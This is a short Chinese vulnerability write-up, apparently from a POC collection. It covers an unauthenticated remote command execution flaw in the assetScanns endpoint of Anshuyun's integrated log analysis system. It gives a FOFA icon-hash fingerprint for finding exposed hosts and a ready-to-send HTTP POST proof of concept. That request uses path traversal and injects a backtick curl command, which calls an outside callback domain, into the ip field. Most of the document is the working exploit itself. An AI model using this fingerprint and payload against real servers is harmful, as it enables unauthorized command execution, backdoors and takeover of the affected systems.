## 安数云综合日志分析系统-assetScanns-远程命令执行漏洞

## 一、漏洞简介
安数云综合日志分析系统 assetScanns 接口存在远程命令执行漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。该漏洞利用难度较低，建议受影响的用户尽快修复。

## fofa
```
icon_hash="-2008445303"
```

## POC
```
POST /js/../assetTopo/assetScanns HTTP/1.1
Host: [目标主机]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

ip=127.0.0.1`curl -mhyenwbij.lfcx.eu.org`&port=8083
```
